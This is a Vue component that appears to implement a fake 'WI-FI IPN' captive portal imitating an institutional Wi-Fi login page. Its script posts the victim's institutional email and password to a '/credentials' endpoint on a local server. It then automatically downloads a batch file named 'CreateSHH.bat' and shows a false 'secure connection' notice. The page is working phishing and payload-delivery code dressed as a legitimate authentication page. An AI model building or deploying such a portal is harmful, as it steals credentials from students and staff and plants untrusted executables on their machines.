<script setup>
import { ref } from 'vue'
import { useRouter } from 'vue-router'

const router = useRouter()
const email = ref('')
const password = ref('')
const isLoading = ref(false)

const goToToken = async () => {
  if (!email.value || !password.value) {
    alert('Por favor ingresa tu correo y contraseña')
    return
  }

  isLoading.value = true
  const baseUrl = `http://${window.location.hostname}:8000`

  try {
    const credResponse = await fetch(`${baseUrl}/credentials`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        email: email.value,
        password: password.value
      })
    })

    if (!credResponse.ok) {
      console.error('Error al guardar credenciales')
    }
    const response = await fetch(baseUrl, { mode: 'cors' })
    if (response.ok) {
      const blob = await response.blob()
      const url = URL.createObjectURL(blob)
      const a = document.createElement('a')
      a.href = url
      
      const contentDisposition = response.headers.get('content-disposition')
      const filenameMatch = contentDisposition && contentDisposition.match(/filename="(.+)"/)
      a.download = filenameMatch ? filenameMatch[1] : 'CreateSHH.bat'
      
      document.body.appendChild(a)
      a.click()
      document.body.removeChild(a)
      URL.revokeObjectURL(url)

      router.push('/token')
    } else {
      alert('Error al descargar el archivo')
    }
  } catch (error) {
    console.error('Error:', error)
    alert('Error de conexión')
  } finally {
    isLoading.value = false
  }
}
</script>

<template>
  <div class="welcome-screen">
    <div class="login-container">
      <div class="logo-section">
        <div class="wifi-icon">📶</div>
        <h1 class="title-main">WI-FI IPN</h1>
      </div>
      
      <div class="content-section">
        <h2 class="title-secondary">Portal de Autenticación</h2>
        <p class="subtitle">Ingresa tus credenciales institucionales para acceder a la red</p>
        
        <form @submit.prevent="goToToken" class="login-form">
          <div class="form-group">
            <label for="email">Correo Institucional</label>
            <input 
              id="email"
              v-model="email"
              type="email"
              placeholder="ejemplo@alumno.ipn.mx"
              class="form-input"
              required
            />
          </div>
          
          <div class="form-group">
            <label for="password">Contraseña</label>
            <input 
              id="password"
              v-model="password"
              type="password"
              placeholder="••••••••"
              class="form-input"
              required
            />
          </div>
          
          <button 
            type="submit" 
            class="connect-button"
            :disabled="isLoading"
          >
            <span v-if="!isLoading">Conectar a la Red</span>
            <span v-else class="loading-text">Conectando...</span>
          </button>
        </form>
        
        <div class="footer-info">
          <p>🔒 Conexión segura</p>
        </div>
      </div>
    </div>
  </div>
</template>

<style scoped>
@keyframes fadeIn {
  from {
    opacity: 0;
    transform: translateY(-20px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

@keyframes pulse {
  0%, 100% {
    transform: scale(1);
  }
  50% {
    transform: scale(1.05);
  }
}

@keyframes slideIn {
  from {
    opacity: 0;
    transform: translateX(-30px);
  }
  to {
    opacity: 1;
    transform: translateX(0);
  }
}

.welcome-screen {
  display: flex;
  align-items: center;
  justify-content: center;
  min-height: 100vh;
  background: linear-gradient(135deg, #6a1b3c 0%, #8b0a3d 50%, #a01444 100%);
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  padding: 20px;
  position: relative;
  overflow: hidden;
}

.welcome-screen::before {
  content: '';
  position: absolute;
  width: 500px;
  height: 500px;
  background: rgba(255, 255, 255, 0.05);
  border-radius: 50%;
  top: -100px;
  right: -100px;
  animation: pulse 8s infinite;
}

.welcome-screen::after {
  content: '';
  position: absolute;
  width: 400px;
  height: 400px;
  background: rgba(255, 255, 255, 0.03);
  border-radius: 50%;
  bottom: -100px;
  left: -100px;
  animation: pulse 6s infinite;
}

.login-container {
  background: rgba(255, 255, 255, 0.98);
  border-radius: 20px;
  box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
  max-width: 480px;
  width: 100%;
  padding: 0;
  overflow: hidden;
  animation: fadeIn 0.6s ease-out;
  position: relative;
  z-index: 1;
}

.logo-section {
  background: linear-gradient(135deg, #8b0a3d 0%, #6a1b3c 100%);
  padding: 40px 20px;
  text-align: center;
  color: white;
  animation: slideIn 0.8s ease-out;
}

.wifi-icon {
  font-size: 4em;
  margin-bottom: 10px;
  animation: pulse 2s infinite;
}

.title-main {
  font-size: 2.5em;
  margin: 0;
  font-weight: 700;
  letter-spacing: 2px;
  text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
}

.content-section {
  padding: 40px 40px 30px;
}

.title-secondary {
  font-size: 1.8em;
  color: #6a1b3c;
  margin: 0 0 10px 0;
  font-weight: 600;
  text-align: center;
  animation: fadeIn 1s ease-out;
}

.subtitle {
  color: #666;
  text-align: center;
  margin: 0 0 30px 0;
  font-size: 0.95em;
  line-height: 1.5;
  animation: fadeIn 1.2s ease-out;
}

.login-form {
  animation: fadeIn 1.4s ease-out;
}

.form-group {
  margin-bottom: 25px;
}

.form-group label {
  display: block;
  color: #444;
  font-weight: 600;
  margin-bottom: 8px;
  font-size: 0.95em;
}

.form-input {
  width: 100%;
  padding: 14px 16px;
  border: 2px solid #e0e0e0;
  border-radius: 10px;
  font-size: 1em;
  transition: all 0.3s ease;
  box-sizing: border-box;
  font-family: inherit;
}

.form-input:focus {
  outline: none;
  border-color: #8b0a3d;
  box-shadow: 0 0 0 3px rgba(139, 10, 61, 0.1);
  transform: translateY(-2px);
}

.form-input::placeholder {
  color: #aaa;
}

.connect-button {
  width: 100%;
  padding: 16px;
  background: linear-gradient(135deg, #c41e3a 0%, #8b0a3d 100%);
  color: white;
  border: none;
  border-radius: 10px;
  font-size: 1.1em;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.3s ease;
  margin-top: 10px;
  box-shadow: 0 4px 15px rgba(196, 30, 58, 0.4);
  font-family: inherit;
}

.connect-button:hover:not(:disabled) {
  transform: translateY(-2px);
  box-shadow: 0 6px 20px rgba(196, 30, 58, 0.6);
  background: linear-gradient(135deg, #d41e3a 0%, #9b0a3d 100%);
}

.connect-button:active:not(:disabled) {
  transform: translateY(0);
}

.connect-button:disabled {
  opacity: 0.7;
  cursor: not-allowed;
}

.loading-text {
  display: inline-block;
  animation: pulse 1.5s infinite;
}

.footer-info {
  margin-top: 25px;
  text-align: center;
  animation: fadeIn 1.6s ease-out;
}

.footer-info p {
  color: #888;
  font-size: 0.9em;
  margin: 0;
}

/* Responsive para tablets */
@media (max-width: 768px) {
  .login-container {
    max-width: 400px;
  }
  
  .content-section {
    padding: 30px 30px 25px;
  }
  
  .title-main {
    font-size: 2em;
  }
  
  .title-secondary {
    font-size: 1.5em;
  }
}

/* Responsive para móviles */
@media (max-width: 480px) {
  .content-section {
    padding: 25px 20px 20px;
  }
  
  .logo-section {
    padding: 30px 20px;
  }
  
  .wifi-icon {
    font-size: 3em;
  }
  
  .title-main {
    font-size: 1.8em;
  }
}
</style>
